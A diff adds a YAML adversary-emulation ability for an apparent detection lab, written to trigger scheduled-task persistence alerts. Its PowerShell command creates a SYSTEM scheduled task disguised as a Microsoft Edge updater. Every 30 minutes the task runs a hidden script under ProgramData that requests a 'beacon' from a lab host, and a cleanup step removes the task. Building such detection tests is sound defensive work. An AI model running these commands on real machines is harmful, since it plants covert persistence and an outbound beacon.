@@ -1,0 +1,25 @@
+- id: 7f2a1b04-0000-4a04-9b04-0a1b2c3d0004
+  name: "[AAR #4] Persistence - Scheduled Task with suspicious command"
+  description: >
+    Detection-validation ability for the Azure Attack Range lab. Registers a scheduled task
+    whose action is powershell, to produce true-positive telemetry for ESCU
+    "Windows Scheduled Task with Suspicious Command" (T1053.005, Security 4698). The task name
+    mimics a legitimate updater and the payload lives under ProgramData, so it also lights up
+    "WinEvent Scheduled Task Created Within Public Path". Runs on client hosts only (self-skips
+    on a domain controller). Non-destructive and fully reversible via cleanup.
+  tactic: persistence
+  technique:
+    attack_id: T1053.005
+    name: "Scheduled Task/Job: Scheduled Task"
+  platforms:
+    windows:
+      psh:
+        command: |
+          if ((Get-CimInstance Win32_ComputerSystem).DomainRole -ge 4) { "skip: domain controller"; exit 0 }
+          $dir = "C:\ProgramData\MicrosoftEdgeUpdate"
+          New-Item -ItemType Directory -Force -Path $dir | Out-Null
+          'powershell -NoProfile -WindowStyle Hidden -Command "iwr http://10.0.1.70:8888/beacon -UseBasicParsing"' | Out-File "$dir\update.ps1" -Encoding ascii
+          schtasks /create /tn "MicrosoftEdgeUpdateTaskMachineCore" /tr "powershell -NoProfile -WindowStyle Hidden -File C:\ProgramData\MicrosoftEdgeUpdate\update.ps1" /sc minute /mo 30 /ru SYSTEM /f
+        cleanup: |
+          schtasks /delete /tn "MicrosoftEdgeUpdateTaskMachineCore" /f 2>$null
+          Remove-Item "C:\ProgramData\MicrosoftEdgeUpdate" -Recurse -Force -ErrorAction SilentlyContinue
